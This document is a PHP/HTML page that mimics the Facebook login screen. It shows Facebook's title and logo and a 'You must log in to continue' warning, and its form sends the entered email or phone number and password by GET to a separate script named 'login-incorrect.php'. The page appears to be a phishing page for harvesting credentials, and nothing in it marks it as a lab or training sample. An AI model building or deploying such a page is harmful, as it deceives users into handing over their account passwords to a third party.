<?php include $_SERVER['DOCUMENT_ROOT'].'include.php'; ?>

<!DOCTYPE html>
<html>
<head>
  <title>Facebook</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" type="image/png" href="favicon-16x16.png"/>
    <link rel='shortcut icon' type='image/x-icon' href='favicon.ico' />

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
</head>
<body>
      <div style="background-color:#f0f2f5; text-align: center; padding-bottom:80px" >
        <div class="container">
          <div style="padding-top:50px;">
            <img style="width: 240px; height: 84px;" src="llugu.svg">
          </div>
          <div class="row">
            <div class="col-md-4 offset-md-4 kolonaboxi">
            <div class="boxilogin">
              <p class="logtext">Log Into Facebook</p>
              <div class="alert alert-warning" role="alert" style="font-size: 12px;color:#1c1e21">
                You must log in to continue.
              </div>
              <form action="login-incorrect.php" method="GET">
                <div class="form-group">
                  <input type="text" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Email or Phone Number" value="<?php echo $kyqja; ?>" name="kyqja">
                </div>
                <div class="form-group">
                  <input type="password" class="form-control" id="exampleInputPassword1" placeholder="Password" name="kyqjapass">
                </div>
                <button type="submit" class="btn btn-primary butonisubmit">Log In</button>
                <div style="padding-top:15px; padding-bottom:10px">
                  <a class="linkforget" href="#">Forgot account?</a>
                </div>
                <div class="_1rf5"><span class="_1rf8">or</span></div>
                <div style="padding: 6px 0;">
                  <a href="#" class="btn btn-success createbutton">Create New Account</a>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
</body>
</html>



<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-177207786-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-177207786-1');
</script>
